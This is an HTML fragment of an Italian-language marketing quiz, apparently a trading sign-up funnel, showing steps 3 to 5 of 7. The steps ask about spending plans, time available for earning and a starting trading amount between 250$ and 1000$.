                                        <img data-v-44fad548="" src="data:image/png;base64,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" class="whitelabel__icon" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="quiz-container test-step">
                    <div class="quiz">
                        <div class="quiz__questions">
                            <div class="quiz__questions-header">
                                <div class="title quiz__question-title quiz__question-title_without-title">
                                    <span class="is-block">Dove pensi di spendere i tuoi primi soldi guadagnati
                                        ?</span>
                                </div>
                            </div>
                            <div class="question quiz__question question_variants" id="DJ17A5860g">
                                <div class="answer-variants answer-variants_has_image">
                                    <div class="answer-variants__group" data-question="Dove pensi di spendere i tuoi primi soldi guadagnati ?">
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Rimborsare prestiti / mutui / debiti">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step4" value="Rimborsare prestiti / mutui / debiti " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Rimborsare prestiti / mutui / debiti&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Comprerò ciò che ho sempre sognato">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step4" value="Comprerò ciò che ho sempre sognato " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Comprerò ciò che ho sempre sognato&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="In viaggio">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step4" value="In viaggio" />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">In viaggio</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Li investirò di nuovo per aumentare il capitale">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step4" value="Li investirò di nuovo per aumentare il capitale" />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Li investirò di nuovo per aumentare il capitale
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="answer-variants__image">
                                        <img src="img/3.webp" alt="" class="answer-variants__image-img" />
                                    </div>
                                </div>
                            </div>
                            <div class="quiz__whitelabel quiz__whitelabel_mobile" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "></div>
                            <div class="quiz__buttons">
                                <div class="quiz-buttons is-outline">
                                    <div class="quiz-buttons__progress">
                                        <div class="progress-bar">
                                            <div class="progress-bar-circular-steps">
                                                <div class="progress-bar-circular-steps__label">
                                                    Passo 3 su 7
                                                </div>
                                                <div class="progress-bar-circular-steps__gradient-wrapp" style="--left-percent: 0%; --right-percent: 50%">
                                                    <div class="progress-bar-circular-steps__steps" style="left: 0px">
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <button class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn">
                                        <span class="quiz-buttons__button_next-text">Avanti</span>
                                        <span class="icon quiz-buttons__next-icon">
                                            <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                                                <title>mdi-arrow-right</title>
                                                <path d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z" stroke-width="0" fill-rule="nonzero"></path>
                                            </svg>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="quiz__whitelabel_fixed-bottom">
                            <div data-v-44fad548="" class="whitelabel" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  ">
                                <div data-v-44fad548="" class="whitelabel__container">
                                    <div data-v-44fad548="" class="whitelabel__icon-bg">
                                        <img data-v-44fad548="" src="data:image/png;base64,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" class="whitelabel__icon" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="quiz-container test-step">
                    <div class="quiz">
                        <div class="quiz__questions">
                            <div class="quiz__questions-header">
                                <div class="title quiz__question-title quiz__question-title_without-title">
                                    <span class="is-block">Quanto tempo sei disposto a dedicare al guadagno ?</span>
                                </div>
                            </div>
                            <div class="question quiz__question question_variants" id="DJ17A5860g">
                                <div class="answer-variants answer-variants_has_image">
                                    <div class="answer-variants__group" data-question="Quanto tempo sei disposto a dedicare al guadagno ?">
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Poche ore al giorno">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step5" value="Poche ore al giorno " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Poche ore al giorno&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Tutto il giorno">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step5" value="Tutto il giorno " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Tutto il giorno&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Un giorno alla settimana">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step5" value="Un giorno alla settimana " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Un giorno alla settimana&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="Un giorno al mese">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step5" value="Un giorno al mese " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">
                                                            Un giorno al mese&nbsp;
                                                        </div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="answer-variants__image">
                                        <img src="img/koshelek.webp" alt="" class="answer-variants__image-img" />
                                    </div>
                                </div>
                            </div>
                            <div class="quiz__whitelabel quiz__whitelabel_mobile" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "></div>
                            <div class="quiz__buttons">
                                <div class="quiz-buttons is-outline">
                                    <div class="quiz-buttons__progress">
                                        <div class="progress-bar">
                                            <div class="progress-bar-circular-steps">
                                                <div class="progress-bar-circular-steps__label">
                                                    Passo 4 su 7
                                                </div>
                                                <div class="progress-bar-circular-steps__gradient-wrapp" style="--left-percent: 0%; --right-percent: 50%">
                                                    <div class="progress-bar-circular-steps__steps" style="left: 0px">
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <button class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn">
                                        <span class="quiz-buttons__button_next-text">Avanti</span>
                                        <span class="icon quiz-buttons__next-icon">
                                            <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                                                <title>mdi-arrow-right</title>
                                                <path d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z" stroke-width="0" fill-rule="nonzero"></path>
                                            </svg>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="quiz__whitelabel_fixed-bottom">
                            <div data-v-44fad548="" class="whitelabel" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  ">
                                <div data-v-44fad548="" class="whitelabel__container">
                                    <div data-v-44fad548="" class="whitelabel__icon-bg">
                                        <img data-v-44fad548="" src="data:image/png;base64,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" class="whitelabel__icon" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="quiz-container test-step">
                    <div class="quiz">
                        <div class="quiz__questions">
                            <div class="quiz__questions-header">
                                <div class="title quiz__question-title quiz__question-title_without-title">
                                    <span class="is-block">Con quale importo vorresti iniziare a fare trading
                                        ?</span>
                                </div>
                            </div>
                            <div class="question quiz__question question_variants" id="DJ17A5860g">
                                <div class="answer-variants answer-variants_has_image">
                                    <div class="answer-variants__group" data-question="Con quale importo vorresti iniziare a fare trading ?">
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="250$">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step6" value="250$" />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">250$</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="500$">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step6" value="500$" />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">500$</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="750$">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step6" value="750$ " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">750$&nbsp;</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                        <div data-element-index="0" class="answer-variants__variant-text answer-btn" data-answer="1000$">
                                            <label tabindex="0" class="b-radio radio">
                                                <input tabindex="-1" type="radio" name="step6" value="1000$ " />
                                                <span class="check"></span>
                                                <span class="control-label">
                                                    <div class="answer">
                                                        <div class="answer__title">1000$&nbsp;</div>
                                                    </div>
                                                </span>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="answer-variants__image">
                                        <img src="img/5.webp" alt="" class="answer-variants__image-img" />
                                    </div>
                                </div>
                            </div>
                            <div class="quiz__whitelabel quiz__whitelabel_mobile" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "></div>
                            <div class="quiz__buttons">
                                <div class="quiz-buttons is-outline">
                                    <div class="quiz-buttons__progress">
                                        <div class="progress-bar">
                                            <div class="progress-bar-circular-steps">
                                                <div class="progress-bar-circular-steps__label">
                                                    Passo 5 su 7
                                                </div>
                                                <div class="progress-bar-circular-steps__gradient-wrapp" style="--left-percent: 0%; --right-percent: 50%">
                                                    <div class="progress-bar-circular-steps__steps" style="left: 0px">
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active">
                                                        </div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                        <div class="progress-bar-circular-steps__step"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <button class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn">
                                        <span class="quiz-buttons__button_next-text">Avanti</span>
                                        <span class="icon quiz-buttons__next-icon">
                                            <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
                                                <title>mdi-arrow-right</title>
                                                <path d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z" stroke-width="0" fill-rule="nonzero"></path>
                                            </svg>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="quiz__whitelabel_fixed-bottom">
                            <div data-v-44fad548="" class="whitelabel" style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  ">
                                <div data-v-44fad548="" class="whitelabel__container">
                                    <div data-v-44fad548="" class="whitelabel__icon-bg">
